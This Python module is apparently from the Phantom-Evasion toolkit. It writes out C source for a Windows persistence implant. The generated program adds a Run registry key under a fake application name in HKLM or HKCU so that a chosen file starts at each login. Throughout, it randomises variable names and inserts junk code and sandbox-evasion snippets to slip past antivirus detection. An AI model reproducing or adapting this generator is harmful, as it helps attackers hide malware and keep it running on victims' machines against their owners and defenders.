
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import sys
from random import shuffle  
sys.path.append("Modules/payloads/auxiliar")
from usefull import varname_creator
from usefull import Junkmathinject
from usefull import windows_evasion
from usefull import spawn_multiple_process
from usefull import close_brackets_multiproc

PathOrFilename = sys.argv[1]

FakeAppname = sys.argv[2]

Elevated = sys.argv[3]

Evasion_Junkcode = sys.argv[4]

Output_result = sys.argv[5]

SpawnMultiProc = int(sys.argv[6])

Randvarpath = varname_creator()

Randvarpath2 = varname_creator()

RandHKey = varname_creator()

RandHKey2 = varname_creator()

RandLResult = varname_creator()

RandLResult2 = varname_creator()

Randhandle = varname_creator()

RandSZvalue = varname_creator()

RandFSuccess = varname_creator()

RandFSuccess2 = varname_creator()

RandDWsize = varname_creator()

RandDWsize2 = varname_creator()

RandCount = varname_creator()

RandRegtype = varname_creator()

Junkcode_01 = Junkmathinject()	        # Junkcode
Junkcode_02 = Junkmathinject()		# Junkcode
Junkcode_03 = Junkmathinject()		# Junkcode
Junkcode_04 = Junkmathinject()		# Junkcode
Junkcode_05 = Junkmathinject()		# Junkcode
Junkcode_06 = Junkmathinject()		# Junkcode
Junkcode_07 = Junkmathinject()		# Junkcode

WinEvasion_01 = windows_evasion()
WinEvasion_02 = windows_evasion()
WinEvasion_03 = windows_evasion()
WinEvasion_04 = windows_evasion()
WinEvasion_05 = windows_evasion()

 

Hollow_code = ""

Include_List = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]

shuffle(Include_List)

for i in range(0,len(Include_List)):

    Hollow_code += Include_List[i]

Hollow_code += "int main(int argc, char * argv[]){\n"

if Evasion_Junkcode == "True":
    Hollow_code += Junkcode_01
    Hollow_code += WinEvasion_01
    Hollow_code += Junkcode_02
    Hollow_code += WinEvasion_02
    Hollow_code += Junkcode_03
    Hollow_code += WinEvasion_03
    Hollow_code += Junkcode_04
    Hollow_code += WinEvasion_04
    Hollow_code += Junkcode_05
    Hollow_code += WinEvasion_05


Hollow_code += spawn_multiple_process(SpawnMultiProc)
Hollow_code += "wchar_t " + Randvarpath + "[260];\n"
Hollow_code += "HMODULE " + Randhandle + " = LoadLibrary(TEXT(\"" + PathOrFilename + "\"));\n"
Hollow_code += "GetModuleFileNameW(" + Randhandle + ", " + Randvarpath + ", 260);\n"
Hollow_code += "HKEY " + RandHKey + " = NULL;LONG " + RandLResult + " = 0;BOOL " + RandFSuccess + " = TRUE;\n"
Hollow_code += "DWORD " + RandDWsize + ";const size_t " + RandCount + " = 260*2;\n"
Hollow_code += "wchar_t " + RandSZvalue + "[260*2] = {};\n"
Hollow_code += "wcscpy_s(" + RandSZvalue + ", " + RandCount + ", L\"\\\"\");\n"
Hollow_code += "wcscat_s(" + RandSZvalue + ", " + RandCount + ", " + Randvarpath + ");\n"
Hollow_code += "wcscat_s(" + RandSZvalue + ", " + RandCount + ", L\"\\\" \");\n"

if Elevated == "True":
    Hollow_code += "" + RandLResult + " = RegCreateKeyExW(HKEY_LOCAL_MACHINE, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &" + RandHKey + ", NULL);\n"
else:
    Hollow_code += "" + RandLResult + " = RegCreateKeyExW(HKEY_CURRENT_USER, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &" + RandHKey + ", NULL);\n"

Hollow_code += "" + RandFSuccess + " = (" + RandLResult + " == 0);\n"
Hollow_code += "if (" + RandFSuccess + "){\n"
Hollow_code += "" + RandDWsize + " = (wcslen(" + RandSZvalue + ")+1)*2;\n"
Hollow_code += "" + RandLResult + " = RegSetValueExW(" + RandHKey + ",L\"" + FakeAppname + "\", 0, REG_SZ, (BYTE*)" + RandSZvalue + ", " + RandDWsize+ ");"
Hollow_code += "" + RandFSuccess + " = (" + RandLResult + " == 0);}\n"
Hollow_code += "if (" + RandHKey + " != NULL){RegCloseKey(" + RandHKey + ");" + RandHKey + " = NULL;}\n"
Hollow_code += "HKEY " + RandHKey2 + " = NULL;LONG " + RandLResult2 + " = 0;BOOL " + RandFSuccess2 + " = TRUE;DWORD " + RandRegtype + " = REG_SZ;\n"
Hollow_code += "wchar_t " + Randvarpath2 + "[260]  = {};DWORD " + RandDWsize2 + " = sizeof(" + Randvarpath + ");\n"

if Elevated == "True":
    Hollow_code += "" + RandLResult2 + " = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_READ, &" + RandHKey2 + ");\n"
else:
    Hollow_code += "" + RandLResult2 + " = RegOpenKeyExW(HKEY_CURRENT_USER, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, KEY_READ, &" + RandHKey2 + ");\n"

## Output Completed or Failed
if Output_result == "True":
    Hollow_code += RandFSuccess2 + " = (" + RandLResult + " == 0);\n"
    Hollow_code += "if (" + RandFSuccess2 + "){\n"
    Hollow_code += "" + RandLResult2 + " = RegGetValueW(" + RandHKey2 + ", NULL,L\"" + FakeAppname + "\", RRF_RT_REG_SZ, &" + RandRegtype + ", " + Randvarpath2 + ", &" + RandDWsize2 + ");\n"
    Hollow_code += "" + RandFSuccess2 + " = (" + RandLResult2 + " == 0);}\n"
    Hollow_code += "if (" + RandFSuccess2 + "){\n"
    Hollow_code += "" + RandFSuccess2 + " = (wcslen(" + Randvarpath2 + ") > 0) ? TRUE : FALSE;}\n"
    Hollow_code += "if (" + RandHKey + " != NULL){RegCloseKey(" + RandHKey2 + ");" + RandHKey2 + " = NULL;}\n"
    Hollow_code += "if (" + RandFSuccess + " == TRUE){printf(\"\\n [>] Completed\\n\");}\n"
    Hollow_code += "else {printf(\"\\n [>] Failed\\n\");}\n"
    Hollow_code += close_brackets_multiproc(SpawnMultiProc)

if Evasion_Junkcode == "True":
    Hollow_code+= "}}" + Junkcode_06 + "}}" + Junkcode_07 + "}\n"

Hollow_code += "return(0);}\n"
Hollow_code = Hollow_code.encode('utf-8')



with open('Source.c','wb') as f:
    f.write(Hollow_code)
